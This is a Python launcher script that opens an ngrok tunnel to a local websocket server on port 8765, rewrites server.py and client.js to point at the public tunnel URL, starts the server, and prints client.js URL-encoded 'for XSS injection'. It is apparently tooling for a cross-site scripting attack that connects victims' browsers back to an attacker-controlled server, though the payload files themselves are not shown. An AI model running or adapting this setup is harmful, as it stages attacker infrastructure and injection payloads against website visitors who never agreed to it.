import os
import subprocess
import time
import json
import urllib.parse

# Check if Ngrok is installed
def check_ngrok_installed():
    try:
        subprocess.run(["ngrok", "version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
    except subprocess.CalledProcessError:
        print("Ngrok is not installed. Please install Ngrok and try again.")
        return False

# Start Ngrok HTTP tunnel on port 8765 in a new terminal
def start_ngrok():
    print("Starting Ngrok HTTP tunnel on port 8765...")
    
    # Check platform (Windows or Unix-based)
    if os.name == 'nt':  # For Windows
        ngrok_process = subprocess.Popen(["start", "cmd", "/K", "ngrok", "http", "8765"], shell=True)
    else:  # For Linux or macOS
        ngrok_process = subprocess.Popen(["gnome-terminal", "--", "bash", "-c", "ngrok http 8765; exec bash"])
    
    # Wait for Ngrok to start and get the public URL
    time.sleep(3)  # Give Ngrok a few seconds to start
    try:
        # Read the URL from Ngrok's API
        ngrok_url = subprocess.check_output(["curl", "-s", "http://localhost:4040/api/tunnels"]).decode("utf-8")
        ngrok_data = json.loads(ngrok_url)
        public_url = ngrok_data['tunnels'][0]['public_url']
        return public_url
    except subprocess.CalledProcessError as e:
        print(f"Error getting Ngrok URL: {e}")
        return None

# Update the server.py file with the Ngrok URL
def update_server_url(ngrok_url):
    server_file = 'server.py'
    with open(server_file, 'r') as file:
        content = file.read()

    updated_content = content.replace('http://localhost:8765', ngrok_url)

    with open(server_file, 'w') as file:
        file.write(updated_content)
    print(f"Updated {server_file} with Ngrok URL: {ngrok_url}")

# Update the client.js file with the Ngrok WebSocket URL
def update_client_url(ngrok_url):
    client_file = 'client.js'
    with open(client_file, 'r') as file:
        content = file.read()

    updated_content = content.replace('wss://localhost:8765', f'wss://{ngrok_url[8:]}')

    with open(client_file, 'w') as file:
        file.write(updated_content)
    print(f"Updated {client_file} with Ngrok WebSocket URL: {ngrok_url[8:]}")

# URL-encode the client.js content
def url_encode_client_js():
    with open("client.js", "r") as file:
        client_js = file.read()

    # URL encode the content of client.js
    encoded_js = urllib.parse.quote(client_js)
    return encoded_js

# Main function to run the process
def main():
    if not check_ngrok_installed():
        return

    # Start Ngrok and get the public URL
    ngrok_url = start_ngrok()
    if not ngrok_url:
        return

    # Update the server.py and client.js files with the Ngrok URL
    update_server_url(ngrok_url)
    update_client_url(ngrok_url)

    # Start the server.py script
    print("Starting server.py...")
    subprocess.Popen(["python", "server.py"])

    # Encode client.js for use in URL (in case of XSS)
    encoded_client_js = url_encode_client_js()
    print(f"\nClient.js URL-encoded for XSS injection:\n{encoded_client_js}")

if __name__ == '__main__':
    main()
